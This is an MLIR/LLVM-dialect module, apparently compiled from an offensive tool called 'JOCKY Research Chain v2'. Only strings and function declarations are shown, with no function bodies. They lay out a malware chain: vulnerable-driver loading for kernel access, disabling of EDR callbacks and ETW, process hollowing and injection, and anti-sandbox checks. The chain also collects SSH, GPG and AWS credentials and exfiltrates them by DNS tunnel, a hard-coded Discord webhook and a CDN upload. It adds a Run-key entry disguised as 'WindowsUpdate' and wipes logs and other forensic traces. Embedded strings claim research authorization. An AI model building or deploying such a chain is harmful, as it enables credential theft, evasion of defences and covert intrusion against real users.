module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, i64 = dense<[32, 64]> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little">, llvm.module_asm = [], llvm.target_triple = ""} {
  llvm.mlir.global private constant @".str.0"("JOCKY_CDN_ENDPOINT\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.1"(dense<0> : tensor<1xi8>) {addr_space = 0 : i32, dso_local} : !llvm.array<1 x i8>
  llvm.mlir.global private constant @".str.2"("https://10.0.2.2:8443/upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.3"("JOCKY_CDN_TOKEN\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.4"("Bearer research_caddy_auth_token_v2_2024\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.5"("JOCKY_MODEL_PATH\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.6"("/opt/models/phi3_evasion.gguf\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.7"("[*] JOCKY Research Chain v2 - Initialization\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.8"("    Components:\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.9"("    - BYOVD: 9-driver fallback chain\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.10"("    - AI: ML-based threat assessment\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.11"("    - Exfil: Multi-channel (DNS, Discord, CDN)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.12"("    - Forensics: Comprehensive cleanup\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.13"("startup\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.14"("init_start\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.15"("version:2.0\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.16"("begin\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.17"("[+] Audit trail initialized\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.18"("[+] Ready to load BYOVD driver chain\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.19"("[*] Attempting BYOVD driver chain loading...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.20"("    Drivers to try: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.21"("  [\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.22"("/\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.23"("] \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.24"("      [+] LOADED - Handle: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.25"("      [+] Device: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.26"("      [+] IOCTL Base: 0x\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.27"("      [+] EXPLOIT VERIFIED - Kernel access obtained\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.28"("driver_load\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.29"("kernel_access\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.30"("[+] BYOVD chain complete - using \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.31"("      [!] Exploit test failed, trying next driver\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.32"("driver_test\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.33"("exploit_test\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.34"("failed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.35"("      [!] Load failed - driver not available\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.36"("load_attempt\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.37"("[+] BYOVD Chain Summary: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.38"(" driver(s) loaded\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.39"("[!] No BYOVD drivers loaded - using userland-only evasion\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.40"("[*] Assessing threat environment...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.41"("    Collecting telemetry...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.42"("    [+] Threat assessment complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.43"("  Threat Score: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.44"("  Risk Level: CRITICAL\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.45"("threat_assessment\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.46"("risk_level\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.47"("score:\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.48"("critical\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.49"("  Risk Level: MEDIUM\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.50"("medium\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.51"("  Risk Level: LOW\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.52"("low\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.53"("[*] Selecting evasion strategy...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.54"("baseline\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.55"("  [+] Kernel-level evasion available via \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.56"("  [+] Activating aggressive kernel evasion\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.57"("kernel_aggressive\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.58"("ntdll.dll\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.59"("kernel32.dll\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.60"("  [+] Enabling kernel exploitation framework\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.61"("kernel_exploit\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.62"("callbacks_disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.63"("edr_callbacks\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.64"("disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.65"("  [+] Activating hybrid evasion\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.66"("kernel_hybrid\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.67"("  [+] Activating aggressive userland evasion\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.68"("userland_aggressive\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.69"("userland_hybrid\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.70"("  [+] Activating stealth evasion\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.71"("stealth\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.72"("  Strategy: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.73"("evasion_strategy\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.74"("selected\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.75"("active\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.76"("[*] Loading evasion plugins...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.77"("/opt/research/plugins/edr_silence.so\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.78"("/usr/local/lib/evasion.so\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.79"("  [+] Loaded: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.80"("--max-aggression\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.81"("plugin_load\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.82"("loaded\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.83"("  [*] No plugins available (optional)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.84"("[*] Discovering data sources...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.85"("~/downloads\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.86"("~/Documents\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.87"("~/Desktop\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.88"("~/.ssh\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.89"("~/.gnupg\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.90"("~/.aws\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.91"("discovery\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.92"("source_found\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.93"("located\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.94"("  [+] Found \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.95"(" data sources\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.96"("[*] Collecting and encrypting data...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.97"("  [*] Processing: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.98"("aes256_encrypt\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.99"("chunks_\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.100"("encryption\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.101"("file_encrypted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.102"("    [+] \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.103"(" files, \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.104"(" bytes\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.105"("  [+] Total collected: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.106"("  [+] Total chunks: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.107"(" chunks\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.108"("collection\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.109"("complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.110"("bytes\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.111"("[*] Spawning isolated collector process...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.112"("/bin/bash\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.113"("-c 'find ~/downloads -type f -size -50M 2>/dev/null'\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.114"("  [+] Collector PID: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.115"("/tmp/collector_trace\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.116"("  [+] Collector completed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.117"("sandbox\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.118"("collector\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.119"("completed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.120"("[*] Exfiltrating via DNS tunnel...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.121"("research_chain_v2:files=\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.122"(":drivers=\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.123"("research.internal\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.124"("  [+] DNS tunnel delivery successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.125"("exfil\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.126"("dns_tunnel\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.127"("success\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.128"("  [!] DNS tunnel failed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.129"("[*] Sending notification via Discord...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.130"("JOCKY Research Chain Complete - Operations: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.131"(", Drivers: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.132"(", Threat: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.133"("https://discord.com/api/webhooks/1554376227807039530/H9J0Q_lrT4pHORrukrEp6K3xfxVo3mm84yj_AhXK6uulxoJ8E_7jVj7ijf2aeGlHLnws\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.134"("  [+] Discord notification sent\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.135"("discord\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.136"("webhook\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.137"("sent\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.138"("[*] Attempting CDN exfiltration (Local)...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.139"("research_chain_v2:threat=\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.140"("encrypted_research_data_payload_v2\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.141"("encrypted_payload_001\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.142"("  [+] Local CDN delivery successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.143"("  [+] Endpoint: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.144"("  [+] Storage: /opt/jocky-cdn/data/uploads/\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.145"("cdn_upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.146"("  [!] CDN delivery failed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.147"("[*] Setting up Windows persistence...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.148"("Software\\Microsoft\\Windows\\CurrentVersion\\Run\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.149"("  [+] Registry key created\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.150"("WindowsUpdate\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.151"("C:\\ProgramData\\update.exe\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.152"("  [+] Persistence value set\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.153"("persistence\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.154"("registry_set\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.155"("Software\\\\Microsoft\\\\Windows\\\\Run\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.156"("  [!] Registry setup failed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.157"("[*] Cleaning forensic artifacts...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.158"("  [*] Windows artifacts...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.159"("Application,Security,System\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.160"("    [+] Windows cleanup complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.161"("forensics\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.162"("cleanup_complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.163"("windows_artifacts\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.164"("wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.165"("[*] Cleaning Linux forensic artifacts...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.166"("  [+] Linux cleanup complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.167"("linux_artifacts\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.168"("[*] Scheduling self-deletion...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.169"("  [+] Self-deletion scheduled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.170"("self_delete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.171"("binary_path\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.172"("scheduled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.173"("[*] Exporting audit trail...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.174"("/tmp/research_audit.bin\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.175"("  [+] Audit trail integrity verified\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.176"("  [+] Exported to: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.177"("audit\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.178"("export_complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.179"("verified\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.180"("  [!] Audit trail integrity check FAILED\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.181"("================================================================================\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.182"("JOCKY Research Chain v2 - Execution Complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.183"("Summary:\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.184"("  Total Operations Logged: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.185"("  BYOVD Drivers Loaded: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.186"("  Primary Driver: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.187"("  Audit Trail: /tmp/research_audit.bin\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.188"("  Sandbox Trace: /tmp/collector_trace\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.189"("Capabilities:\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.190"("  [\E2\9C\93] BYOVD driver chain loading\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.191"("  [\E2\9C\93] Threat-based strategy selection\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.192"("  [\E2\9C\93] Multi-channel exfiltration\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.193"("  [\E2\9C\93] Forensic trace elimination\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.194"("  [\E2\9C\93] Audit trail with hash chaining\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.195"("Authorization: Red Hat + IIT Bombay Cyber Security Team\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.196"("Purpose: Defense research and detection validation\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.197"("JOCKY Research Chain v2 - Complete Integration\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.198"("BYOVD Driver Chain + Exploitation + Persistence + Multi-Channel Exfiltration\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.199"("Authorized: Red Hat + IIT Bombay Cyber Security Team\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.200"("[*] Windows persistence setup...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.201"("[*] Multi-channel exfiltration...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global external @DRIVER_CHAIN() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @CDN_ENDPOINT() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @CDN_AUTH_TOKEN() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @CDN_CA_CERT() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @ML_MODEL_PATH() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MAX_INFERENCE_TIME_MS(100 : i32) {addr_space = 0 : i32} : i32
  llvm.mlir.global external @audit_log_initialized(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @threat_score(0.000000e+00 : f64) {addr_space = 0 : i32} : f64
  llvm.mlir.global external @loaded_drivers() {addr_space = 0 : i32} : !llvm.array<0 x ptr> {
    %0 = llvm.mlir.undef : !llvm.array<0 x ptr>
    llvm.return %0 : !llvm.array<0 x ptr>
  }
  llvm.mlir.global external @ai_engine_ready(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @operations_count(0 : i32) {addr_space = 0 : i32} : i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string_from_i64(i64) -> !llvm.ptr
  llvm.func @string_from_f64(f64) -> !llvm.ptr
  llvm.func @string_from_bool(i1) -> !llvm.ptr
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @byovd_load_driver(!llvm.ptr) -> i64
  llvm.func @byovd_test_exploit(i64) -> i32
  llvm.func @btr_disable_notifications()
  llvm.func @btr_mask_module(!llvm.ptr)
  llvm.func @ai_init()
  llvm.func @ai_collect_telemetry()
  llvm.func @ai_score_threat() -> f64
  llvm.func @plugin_load(!llvm.ptr) -> i64
  llvm.func @plugin_run(i64, !llvm.ptr)
  llvm.func @edrhoker_detect()
  llvm.func @blindside_unhook_ntdll()
  llvm.func @jocky_exploit_disable_callbacks()
  llvm.func @jocky_exploit_token_replacement(i32, i32)
  llvm.func @jocky_registry_create_key(i64, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32)
  llvm.func @jocky_registry_close_key(!llvm.ptr)
  llvm.func @audit_init(i32)
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_export(!llvm.ptr)
  llvm.func @audit_verify() -> i32
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i64
  llvm.func @sandbox_set_limits(i64, i64, i64, i64)
  llvm.func @sandbox_monitor(i64) -> i32
  llvm.func @sandbox_wait(i64)
  llvm.func @sandbox_export_trace(i64, !llvm.ptr)
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @forensics_wipe_powershell_history()
  llvm.func @forensics_wipe_cmd_history()
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr)
  llvm.func @forensics_flush_arp_cache()
  llvm.func @forensics_clear_dns_cache()
  llvm.func @jocky_cleanup_usn_journal()
  llvm.func @linux_forensics_wipe_bash_history()
  llvm.func @jocky_linux_cleanup_syslog()
  llvm.func @jocky_linux_cleanup_journal()
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_getenv(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_setenv(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
